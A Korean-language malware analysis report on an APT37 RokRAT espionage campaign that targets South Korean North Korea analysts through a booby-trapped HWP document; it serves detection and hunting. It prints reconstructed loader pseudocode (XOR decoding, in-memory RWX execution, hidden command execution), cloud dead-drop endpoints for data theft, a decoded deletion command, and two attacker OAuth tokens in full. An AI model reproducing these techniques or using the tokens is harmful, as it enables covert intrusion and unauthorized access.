---
title: "APT37 RokRAT 다단계 백도어 캠페인 종합 분석 보고서"
date: 2026-05-21 12:00:00 +0900
categories: [Malware Analysis]
tags: [APT37, RokRAT, DPRK, HWP, DLL-sideloading, dead-drop-c2, malware-analysis]
---
# APT37 RokRAT 다단계 백도어 캠페인 종합 분석 보고서

> **악성코드 패밀리**: RokRAT
> **위협 행위자**: APT37 (ScarCruft / Reaper / Group123, 북한 연계 추정)
> **초기 침투 벡터**: 「북한 노동당 창건 80주년 행사 동향 종합.hwp」
> **빌드/캠페인 ID**: `292ACC33D2`
> **위협 등급**: **HIGH**
> **분석 방식**: IDA Pro 9.x
> **작성일**: 2026-05-15

---

## Executive Summary

본 캠페인은 한국의 대북 정보 분석, 통일·안보 정책, 외교 안보 연구 부문 종사자를 표적으로 한 북한 연계 APT37의 사이버 첩보 작전이다. 한컴오피스 한글(`.hwp`) 문서를 1차 침투 벡터로 활용하며, OLE 객체 + 하이퍼링크 트리거 → DLL 사이드로딩 → 다단계 메모리 상주 페이로드 전개 → 다중 클라우드 OAuth dead-drop C2를 결합한 5단계 공격 체인을 구성한다.

핵심 특징은 다음과 같다.

- **HWP OLE 취약점 + 하이퍼링크 클릭 트리거**로 `%TEMP%`에 사이드로딩용 DLL 드롭
- **5단계 메모리 상주 전개**: 디스크 흔적은 Stage 1(HWP), Stage 2(version.dll) 외에는 즉시 삭제 또는 미생성
- **Stage 4의 sRDI 계열 PIC shellcode**가 Stage 5 PE를 메모리에 수동 매핑하여 실행
- **다중 클라우드 dead-drop C2**: Dropbox / pCloud / Yandex Disk 3채널 + 로컬 FS fallback
- **RSA-2048 (`e=17`, 비표준) + AES-128-CBC 하이브리드 암호** + XOR 다층 난독화
- **단일 ASCII 명령 프로토콜**: 알파벳 10종 + 숫자 9종 = 총 19개 명령
- **자율 스크린샷 모듈**: C2 명령 없이 약 61초 주기로 데스크탑 캡처 → 클라우드 업로드
- **고정 캠페인 ID `292ACC33D2`**가 모든 데이터 유출 경로에 박혀 있어 헌팅에 활용 가능

표적 파일 확장자에 `.HWP` 명시, 디코이 콘텐츠가 KDI(한국개발연구원) 보고서·연합뉴스 기사·북한 노동당 창건 80주년 동향 분석으로 구성된 점, 그리고 RokRAT 패밀리의 클라우드 dead-drop·HWP OLE 침투 시그니처가 결합되어 APT37 작전으로 판단된다.

---

## 1. 캠페인 식별자

| 항목 | 값 |
|---|---|
| **캠페인/빌드 ID (멀웨어 내부 고정 마커)** | `292ACC33D2` |
| **디코이 문서명** | 북한 노동당 창건 80주년 행사 동향 종합.hwp |
| **취약점 유형** | HWP OLE 객체 + 하이퍼링크 클릭 트리거 |
| **드롭 경로** | `%TEMP%\vhelp.exe`, `%TEMP%\Volumeid1.exe`, `%TEMP%\version.dll` |
| **빌드 시점 (Stage 5 / RokRAT)** | 2025-09-20 17:00:31 UTC |
| **빌드 시점 (Stage 2 / version.dll)** | 2025-10-19 19:34:35 UTC |
| **운영 추정 기간** | 2025년 9월 ~ 2025년 10월 (1개월 이상 활성) |
| **재감염 방지 마커** | `HKCU\SOFTWARE\DefaultEdit\LastCheckedVersion = REG_DWORD 1` |

**시기적 정합성**: 조선노동당 창건일(매년 10월 10일) 중 2025년은 창건 80주년에 해당한다. Stage 5 컴파일 시점(2025-09-20)이 행사일보다 약 3주 앞선다는 점은 공격자가 이 시기 가장 관심이 모일 북한 동향 이슈를 사전에 예측하여 미끼 문서를 제작한 시기 맞춤형(timely lure) 전략의 전형이다.

---

## 2. 위협 등급 및 평가

| 항목 | 평가 | 근거 |
|---|---|---|
| 전반 등급 | **HIGH** | 국가 행위자 수준 |
| 정교함 | ⭐⭐⭐⭐⭐ | HWP 취약점 + 5단계 메모리 전개 + 표준 암호 정확 구현 + 다중 백엔드 |
| OPSEC | ⭐⭐⭐⭐⭐ | 합법 클라우드 API abuse, multipart 위장, 비표준 RSA 지수 |
| 회복력 | ⭐⭐⭐⭐ | 3 클라우드 채널 + 로컬 FS fallback (단일 차단점 부재) |
| 분석 저항 | ⭐⭐⭐⭐ | 디버거 감지 텔레메트리, 키 wiping, 재감염 방지 |
| 명령 다양성 | ⭐⭐⭐⭐ | 19개 명령 (알파벳 10 + 숫자 9) |
| 탐지 난이도 | 높음 | 파일리스, 정상 클라우드 HTTPS 트래픽 위장, 정상 라이브러리 카모플라주 |
| 영향 범위 | 표적형 | 한국 대북·안보 분석, 정부·싱크탱크·언론·연구기관 |

---

## 3. 공격 체인 개요

```
[Stage 1] HWP 디코이 문서 — 초기 침투 벡터
   ├─ 「북한 노동당 창건 80주년 행사 동향 종합.hwp」
   ├─ 정상 분석 보고서로 위장된 본문
   ├─ 임베디드 OLE 객체 + 악성 하이퍼링크
   └─ 사용자가 하이퍼링크 클릭 → HWP OLE 취약점 트리거
       └─ %TEMP% 경로에 vhelp.exe + Volumeid1.exe + version.dll 드롭
           └─ vhelp.exe가 동일 경로에서 version.dll 사이드로딩

[Stage 2] version.dll — DLL 사이드로딩 트로이 (XOR 0xFA)
   ├─ 정상 version.dll의 17개 export 모두 stub (return 0)
   ├─ DLL_PROCESS_ATTACH 시:
   │    ├─ .rdata 내 0x108E00 byte XOR(0xFA) 페이로드 디코드
   │    ├─ %TEMP%\TMP[XXXX].tmp로 드롭
   │    ├─ LoadLibraryW(임시파일) → DeleteFileW (즉시 삭제)
   │    └─ GetProcAddress("sub_10001A09") 호출

[Stage 3] common.dll — 로더 + 디코이 표시 (메모리 상주)
   ├─ 콘솔/윈도우 숨김 (ShowWindow + EnumWindows 워치독 1ms 주기)
   ├─ 호스트 EXE 파일명 FNV-1a 32-bit 해시 기반 미끼 분기
   │    ├─ 0x52076040 → KDI 보고서 PDF URL 오픈
   │    └─ 0x9F618F77 → 연합뉴스 기사 URL 오픈
   ├─ HKCU\SOFTWARE\DefaultEdit\LastCheckedVersion 검사/마킹 (재감염 방지)
   └─ XOR(0xF9) + SSE2 (PXOR) 디코드 → Stage 4 메모리 전개
       └─ VirtualAlloc(NULL, 0x200000, RWX) + 메모리 직접 호출

[Stage 4] sRDI 계열 PIC shellcode — Reflective Loader
   ├─ PE 헤더 없는 위치 독립 코드 (약 1MB)
   ├─ 자기 위치 획득 트릭 (mov rax, [rsp]; ret)
   ├─ PEB walking + API hash resolver (FNV-1a 변종, ROR 11/15)
   │    ├─ 0x5BCD174B → HeapAlloc / RtlAllocateHeap
   │    ├─ 0xAA7ADB76 → VirtualAlloc
   │    ├─ 0x234CCD4B → memcpy
   │    ├─ 0x406FAB8E → LoadLibraryA
   │    ├─ 0xE99E570A → GetProcAddress
   │    └─ 0x26EB2DC1 → VirtualFree
   ├─ 헤더 구조: [1B XOR_key=0x29][4B PE_size][암호화된 PE]
   ├─ XOR(0x29) 디코드 → 임베디드 Stage 5 PE 복원
   ├─ 수동 PE 매핑 (헤더/섹션/IAT/Relocation)
   └─ TLS 콜백 호출 + EntryPoint 호출

[Stage 5] RokRAT 최종 페이로드 (PE32+, 약 1MB)
   ├─ 정상 라이브러리 다량 정적 링크 (Paradox 게임 엔진, Xbox SDK,
   │    MFC, Crypto++, JsonCpp 등) — 시그니처 회피 카모플라주
   ├─ EntryPoint → __scrt_common_main_seh → WinMain
   ├─ 임베디드 RSA-2048 공개키 디시리얼라이즈 (e=17, 비표준)
   ├─ AES-128-CBC 키 풀 + RSA-OAEP-SHA1 키 wrapping 초기화
   ├─ 호스트 핑거프린트 ID 생성 (host_id, aux_id, main_id)
   ├─ CreateThread → 메인 비콘 루프 (StartAddress @ 0x140015AD8)
   │    ├─ C2 백엔드 election: Dropbox → pCloud → Yandex → 로컬 FS
   │    ├─ 명령 처리 루프 (76초 주기: 1s + 5s×3 + 60s)
   │    │    └─ 19개 단일 ASCII 명령 디스패처
   │    └─ 자율 스크린샷 캡처 (61초 주기, C2 명령 무관)
   └─ 클라우드 폴더 구조: /Program/<host_id>/, /Comment/<rand>292ACC33D2<rand>/
```

---

## 4. 단계별 상세 분석

### 4.1 Stage 1 — HWP 디코이 문서 (초기 침투 벡터)

| 항목 | 값 |
|---|---|
| 파일명 | 북한 노동당 창건 80주년 행사 동향 종합.hwp |
| 침투 방식 | OLE 객체 + 하이퍼링크 클릭 트리거 |
| 드롭 위치 | `%TEMP%` |
| 드롭 파일 | `vhelp.exe`, `Volumeid1.exe`, `version.dll` |
| 사이드로딩 트리거 | `vhelp.exe` 실행 → 동일 경로의 `version.dll` 로드 |

**디코이 콘텐츠의 표적 정합성**: 「북한 노동당 창건 80주년 행사 동향 종합」은 한국의 대북 분석·통일·안보 정책 종사자가 일상적으로 작성·검토하는 보고서 양식을 정밀하게 모방한다. 추정 1차 표적군은 다음과 같다.

| 추정 표적군 | 미끼 적합성 |
|---|---|
| 통일부 / 산하 연구기관 | ★★★★★ 통일정책 결정 부서의 핵심 업무 영역 |
| 국가정보원 / 국방정보본부 | ★★★★★ 북한 동향 분석 핵심 임무 |
| 국방연구원(KIDA), 통일연구원(KINU) | ★★★★★ 북한 행사·정책 동향 정기 보고서 작성 기관 |
| 세종연구소, 아산정책연구원 | ★★★★☆ 대북·안보 분석 싱크탱크 |
| 외교부 한반도평화교섭본부 | ★★★★☆ 북한 정세 보고 수령 부서 |
| 언론사 외교안보부 / 통일부 출입기자 | ★★★★☆ 북한 동향 기사 작성 부문 |

### 4.2 Stage 2 — version.dll (XOR 0xFA 디코더)

| 항목 | 값 |
|---|---|
| 위장 | 정상 `version.dll` Proxy DLL (17개 export 전부 stub @ 0x1800011BC, return 0) |
| 페이로드 위치 | `.rdata` @ `0x1800021D0` |
| 페이로드 크기 | `0x108E00` (1,084,928 bytes) |
| 디코드 알고리즘 | 1-byte XOR (key = `0xFA`) |
| 드롭 경로 | `%TEMP%\TMP[XXXX].tmp` (GetTempFileNameW로 생성) |
| 호출 진입점 | `GetProcAddress(hMod, "sub_10001A09")` |

**핵심 로직** (`DllEntryPoint @ 0x180001000`):

```c
if (fdwReason == DLL_PROCESS_ATTACH) {
    buf = operator new(0x108E27);                // 32B 정렬 1MB 버퍼
    for (i = 0; i < 0x108E00; i++)
        dst[i] = enc[i] ^ 0xFA;                  // XOR 디코드
    GetTempPathW + GetTempFileNameW("TMP")       // %TEMP%\TMP????.tmp
    CreateFileW + WriteFile(decoded, 0x108E00)   // 디스크 드롭
    hMod = LoadLibraryW(임시파일)                // Stage 3 로드
    DeleteFileW(임시파일)                        // 즉시 삭제 (포렌식 회피)
    fn = GetProcAddress(hMod, "sub_10001A09")
    fn();
}
```

**OPSEC 단서**: Stage 3의 export 이름 `sub_10001A09`은 IDA 자동 명명 규칙(`sub_<주소>`)을 그대로 사용한 흔적이다. 공격자가 빌드 후 export 이름을 정리하지 않은 것으로 보이며, 이로부터 Stage 3의 imagebase가 `0x10000000`임을 유추할 수 있다.

### 4.3 Stage 3 — common.dll (디코이 표시 + Stage 4 로더)

**빌드 타임스탬프**: 2025-10-19 19:34:35 UTC

| 항목 | 값 |
|---|---|
| Export | `sub_10001A09` (Stage 2가 호출), `ShowMessageBox` (디버그 잔여물) |
| 메인 워커 | `StartAddress @ 0x180001630` |
| 워치독 | `sub_1800015A0` (1ms 주기 EnumWindows로 본인 PID 윈도우 강제 숨김) |

**메인 워커 흐름**:

```c
sub_1800010C0();          // 1) 호스트 파일명 FNV-1a 해시 → 미끼 URL 분기
if (sub_1800011D0() == 1) // 2) 영속성 마커 검사 (재감염 방지)
{
    Sleep(100);
    ExitProcess(0);
}
sub_180001000();          // 3) 영속성 마커 작성
sub_1800012A0();          // 4) Stage 4 디코드 + 메모리 실행
```

**미끼 URL 분기 (`sub_1800010C0`)**:

```c
GetModuleFileNameW로 호스트 EXE 풀경로 획득
PathFindFileNameW로 파일명만 추출 → 소문자 정규화 → FNV-1a 32-bit 해시

hash == 0x52076040 → ShellExecuteW("open",
    "hxxps://www.kdi.re.kr/file/download?atch_no=kpndSIj%2FdCYIzNcba3dS6w%3D%3D")
hash == 0x9F618F77 → ShellExecuteW("open",
    "hxxps://www.yna.co.kr/view/AKR20250902112300504")
```

공격자가 사회공학용 한글 파일명(예: 보고서·기사 제목을 모방한 EXE)을 사용할 때만 정상 콘텐츠를 자동으로 띄워주는 트릭이다. 사용자는 정상 PDF/기사를 보는 동안 백그라운드에서 백도어가 진입한다.

**Stage 4 디코드 (`sub_1800012A0`)**:

| 항목 | 값 |
|---|---|
| 소스 | `byte_1800023C0` (`.rdata`) |
| 크기 | `0x105F4E` (1,072,974 bytes) |
| 알고리즘 | Phase 1: 16바이트 단위 SSE2 PXOR (xmmword key @ `0x180108340`)<br>Phase 2: 잔여 14바이트 1-byte XOR (key `0xF9`) |
| 메모리 할당 | `VirtualAlloc(NULL, 0x200000, MEM_COMMIT \| MEM_RESERVE, PAGE_EXECUTE_READWRITE)` |
| 실행 방식 | 직접 메모리 호출 (파일리스, 디스크 미존재) |

**SSE2 PXOR의 의의**: 일반적인 단순 XOR 시그니처 룰을 회피하는 효과가 있다.

### 4.4 Stage 4 — sRDI 계열 PIC Shellcode (Reflective Loader)

| 항목 | 값 |
|---|---|
| 형식 | PE 헤더 없는 위치 독립 코드 (PIC) |
| 패턴 | sRDI / Stephen Fewer reflective DLL loader 계열 |
| 자기 위치 획득 | `mov rax, [rsp]; ret` (PIC 표준 기법) |
| Stage 5 시작 오프셋 | `0x749` |
| 헤더 구조 | `[1B XOR_key][4B PE_size][암호화된 PE]` |
| XOR 키 | `0x29` |
| Stage 5 크기 | `0x105800` (1,071,104 bytes) |

**API hash resolver 테이블** (FNV-1a 변종):

| Hash | API |
|---|---|
| `0x5BCD174B` | `RtlAllocateHeap` / `HeapAlloc` |
| `0xAA7ADB76` | `VirtualAlloc` |
| `0x234CCD4B` | `memcpy` |
| `0x406FAB8E` | `LoadLibraryA` |
| `0xE99E570A` | `GetProcAddress` |
| `0x26EB2DC1` | `VirtualFree` |

**동작 흐름**:
1. PEB walking으로 `kernel32.dll` 베이스 획득
2. EAT 순회 + 함수명 해시 비교로 API 동적 해결
3. XOR(0x29) 디코드 → 임베디드 Stage 5 PE 복원
4. 수동 PE 매핑 (헤더/섹션 복사, IAT 해결, Relocation 처리)
5. TLS 콜백 호출 + EntryPoint 호출

### 4.5 Stage 5 — RokRAT 최종 페이로드

#### 4.5.1 카모플라주 전략

공격자는 **Paradox 게임 엔진 + Xbox SDK + MFC + Crypto++ + JsonCpp** 등 다수의 정상 C++ 라이브러리를 정적 링크하여 1MB DLL을 구성했다. 정상 라이브러리가 80% 이상을 차지하고 악성 로직은 그 안에 묻혀 있어, 정적 시그니처 기반 탐지를 효과적으로 회피한다.

#### 4.5.2 진입점 흐름

```
EntryPoint (0x140046A1C)
  └─ __scrt_common_main_seh
       └─ WinMain (0x140015CEC)
            ├─ sub_1400115B4: 임베디드 RSA-2048 공개키 디시리얼라이즈
            │    (DER: 0x1400F60D0 ~ 0x1400F61F4)
            ├─ init_session_keys_and_ids (sub_1400124B4)
            │    ├─ AES 키 풀 2개 + IV salt 생성 (CryptoPP::AutoSeededRandomPool)
            │    └─ 호스트 핑거프린트 ID 3종 생성
            ├─ qword_1400FE19C = "disable" (환경 플래그)
            └─ CreateThread → StartAddress (0x140015AD8) — 메인 비콘 루프
```

#### 4.5.3 호스트 핑거프린트 ID

| 변수 | 포맷 | 길이 | 용도 |
|---|---|---|---|
| `g_host_id` @ `0x1400FDD94` | `%04X%04X` | 8자 | 호스트 식별 |
| `g_aux_id` @ `0x1400FE222` | `%04X%04X%08X` | 16자 | 보조 ID |
| `g_main_id` @ `0x1400FE24A` | `%04X%04X%08X` | 16자 | 메인 통신 ID |

PRNG seed는 `srand(time(NULL))` + `GetTickCount()` 조합으로, 매 실행마다 다른 ID가 생성된다.

#### 4.5.4 다중 클라우드 백엔드 (RTTI로 확정)

| RTTI 클래스 | 클라우드 서비스 |
|---|---|
| `CDropApi` | Dropbox (`server_modified` 응답 필드) |
| `CYanApi` | Yandex Disk (임베디드 OAuth 토큰 2개) |
| `CPcloudApi` | pCloud |
| `oauth2_session` | OAuth 2.0 베이스 클래스 |

**클라우드 API 엔드포인트**:

| 서비스 | Endpoint |
|---|---|
| Dropbox | `hxxps://api.dropboxapi.com/2/files/list_folder`<br>`hxxps://api.dropboxapi.com/2/files/delete`<br>`hxxps://content.dropboxapi.com/2/files/upload`<br>`hxxps://content.dropboxapi.com/2/files/download` |
| pCloud | `hxxps://api.pcloud.com/listfolder` (외 listfolder, getfileurl, uploadfile 등) |
| Yandex Disk | `hxxps://cloud-api.yandex.net/v1/disk/resources?path={bot}&limit=500` |

#### 4.5.5 임베디드 Yandex OAuth Refresh Token

```
Token #1: y0__xCvwqD6BxiitDUgtK7BqRJKUd5n0zFOnE5JA1vpobhCHkgkZg  (53자)
Token #2: y0__xCgjYyMBxjIhDUgqp2umhIg72AOcJ1RXdfk-fIWhJrHtL7_Iw  (53자)
```

`y0__` 접두사는 Yandex OAuth 2.0 refresh_token 표준 시그니처다. 두 토큰은 백업/이중화 용도로, 첫 토큰 실패 시 두 번째로 폴백한다.

#### 4.5.6 메인 비콘 루프 (`StartAddress @ 0x140015AD8`)

```
1. C2 백엔드 election
   ├─ for each c2_slot in g_c2_server_slots:
   │    ├─ session_init / probe (virtual/test/key)
   │    └─ 응답 dispatch:
   │         ├─ Dropbox handler
   │         ├─ pCloud handler
   │         ├─ Yandex Disk handler
   │         └─ 로컬 FS handler (fallback)
   │
2. 명령 처리 루프 (폴링 주기 76초 = 1s + 5s×3 + 60s)
   └─ c2_command_dispatcher (sub_140012CD8)
        └─ 명령 파일명 첫 글자(ASCII) 기반 분기
3. 백그라운드 스크린샷 (61초 주기, sub_1400156A8)
```

---

## 5. C2 명령 프로토콜

C2 응답의 **첫 글자가 명령 코드(단일 ASCII 바이트)** 다. 클라우드 dead-drop 방식이므로 C2 운영자는 봇이 폴링하는 클라우드 디렉토리에 명령 파일을 업로드하고, 봇은 파일명에서 명령을 파싱하여 실행한다.

### 5.1 알파벳 명령 (10종, 단순 동작)

| 코드 | 동작 | 구현 |
|---|---|---|
| `'0'` (0x30) | 스크린샷 캡처 비활성 | `byte_1400F5CB0 = 0` |
| `'i'` (0x69) | 스크린샷 캡처 활성 | `byte_1400F5CB0 = 1` |
| `'b'` (0x62) | 즉시 종료 | `ExitProcess(0x81)` |
| `'j'` (0x6A) | 즉시 종료 (변종) | `ExitProcess(0x81)` |
| `'d'` (0x64) | 자기 정리 + 종료 | 인코딩 wchar 시퀀스 → `del` 명령 실행 |
| `'f'` (0x66) | 자기 정리 (`'d'`의 짧은 변종) | 동일 메커니즘 |
| `'g'` (0x67) | 하트비트 / NOP ACK | `sub_140012C54` 호출 후 즉시 리턴 |
| `'h'` (0x68) | 드라이브 인벤토리 업로드 | `cmd /c dir /A /S` 결과 업로드 |
| `'e'` (0x65) | 임의 명령 실행 (RCE) | `ShellExecuteW("open", "cmd.exe", "/c <arg>", SW_HIDE)` |
| `'c'` (0x63) | 파일 수집 업로드 | `"Normal"` / `"All"` 모드 |

### 5.2 숫자 명령 (9종, 페이로드 실행)

| 코드 | 페이로드 출처 | 디코딩 | 실행 방식 |
|---|---|---|---|
| `'1'`, `'2'` | WinINet 직접 다운로드 (raw URL) | 없음 | 메모리 실행 (`VirtualAlloc(RWX)` + `CreateThread`) |
| `'3'`, `'4'` | 클라우드 응답 본문 | AES-128-CBC + XOR + 매직 검증 | 메모리 실행 |
| `'5'`, `'6'` | WinINet 직접 다운로드 (raw URL) | XOR (`^ key ^ 0x4D`) | 디스크 드롭(`%TEMP%`) + `ShellExecuteA` |
| `'7'`, `'8'`, `'9'` | 클라우드 응답 본문 | AES-128-CBC + XOR + 매직 검증 | 디스크 드롭 + `ShellExecuteA` |

### 5.3 페이로드 처리 파이프라인 (`'3', '4', '7', '8', '9'`)

```
1. c2_module_dispatcher (sub_14001E260)
       └─ 클라우드 응답으로 페이로드 수신 (이미 AES 암호화 상태)

2. aes128_cbc_decrypt_rx_ch2 (sub_1400182E0)
       └─ AES-128-CBC 복호화 (in-place)
           키 소스: g_rx_key_pool_ch2_vec (32B 풀, 세션 고정)
           IV 소스: g_iv_salt_vec
           Key/IV derivation (sub_140017DC0):
               32B 풀 → 상수 패턴 init + XOR fold with 0x72 → 16B key + 16B IV

3. XOR 복호화 루프 (0x140013B83)
       for (i = 0; i < size; i++)
           payload[i] ^= g_xor_key_payload_32b[i mod 32]

4. 매직 footer 검증 (0x140013B9D)
       if (*(uint32_t*)(payload + size - 4) != 0xEEEEEEEE)
           skip execution
```

### 5.4 메모리 실행 분기 (`'1','2','3','4'`, @ 0x140013D84)

```c
VirtualAlloc(NULL, payload_size + 0x4000,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_EXECUTE_READWRITE);            // flProtect = 0x40 (RWX)
memmove(rwx_buf, payload + 5, payload_size);
CreateThread(NULL, 0, rwx_buf, NULL, 0, &tid);
WaitForSingleObject(thread, 60000);              // 60초 timeout
```

### 5.5 디스크 드롭 분기 (`'5'~'9'`, @ 0x140013C49)

```c
GetTempPathA(buf);
for (i = 0; i < size; i++)
    payload[i] ^= seed_byte ^ 0x4D;              // 이중 XOR 디코드
f = fopen("%TEMP%\\<filename>", "wb");
fwrite(payload, 1, size, f);
fclose(f);
ShellExecuteA(NULL, "open", filepath, NULL, NULL, SW_HIDE);
```

특이사항: 디스크 드롭 분기에서는 `0xEEEEEEEE` 매직 footer 검증이 적용되지 않는다.

### 5.6 `'d'` / `'f'` 디코드 알고리즘 (자기 정리)

```python
key = first_wide_char.low_byte
for i in range(1, len):
    out[i-1] = (wide[i].low_byte - key) & 0xFF
```

**`'d'` 디코드 결과 — 지속성 경로 정리 명령**:

```
del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\*.VBS"
    "%appdata%\*.CMD"
    "%appdata%\*.BAT"
    "%appdata%\*01"
    "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk"
    "%allusersprofile%\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk"
    /F /Q
```

이 삭제 패턴은 RokRAT 패밀리의 통상 지속성 경로를 역으로 드러낸다. 헌팅 시 동일 경로 모니터링이 가치 있다.

### 5.7 `'h'` 명령 — 드라이브 인벤토리 (`sub_14001233C`)

```c
GetLogicalDriveStringsA로 모든 드라이브 열거
for each drive of type 2~4 (REMOVABLE/FIXED/REMOTE) {
    sprintf("dir /A /S %s >> \"%%temp%%/%c_.TMP\"", drive, drive_letter)
    ShellExecuteExA(open, cmd.exe, /C <cmd>) + WaitForSingleObject(600s)
    sub_140015164(file)  // 업로드
    DeleteFileW(file)
}
```

### 5.8 `'c'` 명령 — 파일 수집 모드

| 모드 토큰 | 동작 |
|---|---|
| `"Normal"` | 표적 확장자 8종만 업로드: `.XLS .DOC .PPT .TXT .M4A .AMR .PDF .HWP` |
| `"All"` | 모든 파일 업로드 |

`.HWP` 명시 포함은 한국 대상 첩보 활동 확정 근거다. `.M4A`/`.AMR` 음성 파일 표적은 회의록·통화 녹음 등 비공식 정보까지 노린 광범위한 수집 의도를 시사한다.

### 5.9 `KB400928_doc.exe` — 추가 페이로드 (`'c'` 분기 내 변종)

```c
// 1. 16바이트 정적 데이터로 파일명 빌드
*rcx = xmmword_1400D08D0;  // "KB400928_doc.exe"
[rcx+0x10] = byte_1400D08E0;
// 2. 응답 페이로드의 6번째 바이트가 동적 키
key = response[5];
// 3. 이중 XOR 디코드 후 디스크 드롭
for (each byte) *p = (*p ^ key) ^ 0x4D;
fopen("...KB400928_doc.exe", "wb"); fwrite; fclose;
ShellExecuteW(open);
```

파일명이 MS 보안 업데이트(KBxxxx)를 위장한 점도 한국 환경 친화적 사회공학 요소다.

---

## 6. 스크린샷 및 실행 프로세스 수집 모듈 (`sub_1400156A8`)

C2 명령과 무관하게 봇이 자율적으로 데스크탑 화면을 캡처하고 실행 중인 프로세스 정보를 수집하여 클라우드에 업로드하는 능동 정보 수집 모듈이다.

### 6.1 트리거 및 주기

- 메인 비콘 스레드 `StartAddress @ 0x140015AD8`의 do-while 루프에서 직접 호출
- C2 명령 트리거 없이 **약 61초마다 1회 자율 실행 (분당 1회)**
- 실패 시 5초 간격으로 최대 3회 재시도
- `'0'`/`'i'` 명령으로 토글 가능 (`byte_1400F5CB0` 플래그)

### 6.2 파이프라인 (4단계)

```
[Phase 0] 토글 체크
   if (!byte_1400F5CB0) return 1;

[Phase 1] 페이로드 헤더 구성
   매직 시그니처: 0xFA 0xDE 0xAD 0xBA ("fadeadba")
   RSA 공개키 + 호스트 ID 동봉
   IsDebuggerPresent() == TRUE → byte_1400FE14A = '1' (디버거 텔레메트리)
                          FALSE → byte_1400FE14A = '(' (정상 마커)

[Phase 2] 화면 캡처 (GDI + GDI+)
   SetProcessDPIAware()  // 4K/고DPI 정확 캡처
   w = GetSystemMetrics(SM_CXSCREEN)
   h = GetSystemMetrics(SM_CYSCREEN)
   hScreenDC = GetDC(NULL)  // 데스크탑
   BitBlt → CreateCompatibleBitmap → GdipSaveImageToFile (JPEG, 품질 50)
   임시 저장: %TEMP%\xxxx.tmp

[Phase 3] 실행 프로세스 정보 수집 (6회 캡처마다 1회)
   sub_140011C94: 실행 중인 프로세스 인벤토리 수집
                  CreateToolhelp32Snapshot + Process32NextW
                  K32EnumProcessModules로 모듈 정보 보강
                  최대 128KB(0x20000)까지 추가 데이터 동봉

[Phase 4] 암호화 + 업로드
   sub_1400119E4: XOR 4B 키 + AES-128-CBC + RSA-OAEP wrap
   sub_14001F300: 활성 클라우드 백엔드로 multipart 업로드
   업로드 경로: /Comment/<rand>292ACC33D2<rand>
```

### 6.3 디버거 텔레메트리

```c
if (IsDebuggerPresent())
    byte_1400FE14A = 0x31;  // '1' — 디버거 감지됨
else
    byte_1400FE14A = 0x28;  // '(' — 정상
```

**특이사항**: 디버거 감지 시 분기 차단이나 종료를 수행하지 않는다. 대신 마커를 페이로드 헤더에 부착하여 C2 운영자가 분석 환경에서 동작 중인 봇을 식별할 수 있도록만 한다. 능동적 안티-디버그가 아닌 텔레메트리 수단이다.

---

## 7. 암호 시스템

### 7.1 임베디드 RSA-2048 공개키

| 항목 | 값 |
|---|---|
| 객체 위치 | `0x1400FE4F0` |
| DER 위치 | `0x1400F60D0` ~ `0x1400F61F4` |
| Modulus | 2048-bit |
| publicExponent | **`17` (0x11) — 비표준** |
| SPKI SHA256 | `62b069a49c772367c2d7ace2f3fd45be53e8431549cc050ee8f8955eccc61326` |
| Modulus SHA256 | `3253d1149320d7c706442c4fb7883d0ed84f9335af85ed7d4c12a2f3993ab5ae` |

**`e=17`의 의미**:
- 표준 RSA는 `e=65537` (0x10001) 사용
- `e=17`은 OpenSSL `genrsa`, `ssh-keygen` 등 표준 도구로 생성 시 나타나지 않음
- 공격자가 **자체 키 생성 도구**를 사용했음을 시사
- 작은 `e`값은 short-message broadcast attack에 취약하나 RSA-OAEP 패딩 사용 시 완화됨
- 동일 그룹 내 다른 캠페인 매칭 가능 단서

### 7.2 키 계층 구조

```
[프로세스 시작 시 1회 생성 — 수신 채널]
g_rx_key_pool_ch1_vec (32B)  ─┐
                              ├─→ XOR 키 테이블 (g_xor_key_url_32b)
g_rx_key_pool_ch2_vec (32B)  ─┤   XOR 키 테이블 (g_xor_key_payload_32b)
                              │
                              └─→ AES-128 key + IV (derive_aes_key_iv_from_pool)
g_iv_salt_vec                 ─┘   (32B fold → 16B + 16B)

[매 송신마다 ephemeral 생성 — 송신 채널]
ephemeral_aes_key (16B) ─→ AES-128-CBC encrypt payload
                        └─→ RSA-OAEP(SHA1) wrap with g_c2_rsa_public_key
                                                       ↓
                                              메시지 헤더에 동봉 전송
```

### 7.3 송신 메시지 구조 (`tx_send_encrypted_msg` @ `0x1400119E4`)

```
┌──────────────────────────────────────────────────────────┐
│ [8B nonce, XOR with 0x3429AB7C]                          │  변조 감지
├──────────────────────────────────────────────────────────┤
│ [RSA-OAEP-SHA1 wrapped block]                            │
│   └─ 평문 내용:                                            │
│       ├─ 8B IV 자료                                       │
│       ├─ 16B AES-128 ephemeral key (매번 신규)            │
│       └─ 4B 길이 / 메타데이터                              │
├──────────────────────────────────────────────────────────┤
│ [AES-128-CBC encrypted body]                             │
└──────────────────────────────────────────────────────────┘
```

**암호화 라이브러리** (CryptoPP vtable로 확정):
- `CryptoPP::Rijndael::Enc/Dec` + `CBC_Encryption/Decryption`
- `CryptoPP::TF_EncryptorImpl<RSA, OAEP<SHA1, P1363_MGF1>>`
- `CryptoPP::AutoSeededRandomPool` (CryptGenRandom 기반)

### 7.4 송신 vs 수신 키 비대칭 설계

| 방향 | 키 생성 | 갱신 |
|---|---|---|
| 봇 → C2 (송신) | 매 메시지마다 ephemeral 16B 생성 + RSA-OAEP wrap | 매번 |
| C2 → 봇 (수신) | 세션 시작 시 32B 풀 2개 생성 | 세션 고정 |

송신은 매번 새 키 + RSA wrap으로 forward secrecy 효과를 얻고, 수신은 봇이 자신의 RX 키를 초기 핸드셰이크에서 C2에 전달한 후 같은 키로 복호화하는 구조다.

### 7.5 multipart/form-data 업로드

```
Content-Type: multipart/form-data; boundary=--wwjaughalvncjwiajs--
```

**boundary 식별자 `--wwjaughalvncjwiajs--`**: 고유 문자열로 네트워크 헌팅 시그니처 활용 가능. HTTPS 본문 디코드 환경(TLS 인터셉션)에서 탐지 가능.

### 7.6 송신 AES 키 복구 가능성 검토

송신 메시지에는 매번 새로 생성된 16B AES 키가 RSA-OAEP-SHA1로 wrapping되어 헤더에 동봉된다. **이론적으로 메시지에 키가 들어있으나, RSA-OAEP로 암호화되어 있어 C2 운영자의 RSA 개인키 없이는 실용적으로 복호화 불가능하다.** 사후 트래픽 복호화는 메모리 덤프에서 RX 키 풀(32B)을 추출할 수 있는 경우 봇 → C2 트래픽 일부만 가능하다.

---

